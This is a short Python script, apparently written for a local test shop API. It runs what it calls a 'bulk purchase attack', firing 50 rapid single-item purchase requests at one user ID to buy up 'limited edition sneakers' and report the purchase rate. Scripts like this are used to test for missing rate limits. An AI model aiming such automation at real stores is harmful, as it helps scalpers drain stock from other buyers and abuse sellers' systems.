#!/usr/bin/env python3
import requests
import time

API_URL = "http://localhost:5006/api"

def bulk_purchase_attack(product_id, quantity):
    print(f"[*] Starting bulk purchase attack on product {product_id}")
    print(f"[*] Target quantity: {quantity}")
    
    start_time = time.time()
    successful = 0
    failed = 0
    
    for i in range(quantity):
        try:
            response = requests.post(f"{API_URL}/purchase", json={
                'user_id': 1,
                'product_id': product_id,
                'quantity': 1
            }, timeout=5)
            
            if response.status_code == 200:
                successful += 1
                print(f"[+] Purchase {i+1}/{quantity} successful")
            else:
                failed += 1
                print(f"[-] Purchase {i+1}/{quantity} failed: {response.json()}")
        except Exception as e:
            failed += 1
            print(f"[-] Error on purchase {i+1}: {e}")
    
    elapsed = time.time() - start_time
    
    print(f"\n[*] Attack completed in {elapsed:.2f} seconds")
    print(f"[*] Successful: {successful}, Failed: {failed}")
    print(f"[*] Rate: {successful/elapsed:.2f} purchases/second")

if __name__ == "__main__":
    # Attack limited edition sneakers
    bulk_purchase_attack(product_id=1, quantity=50)
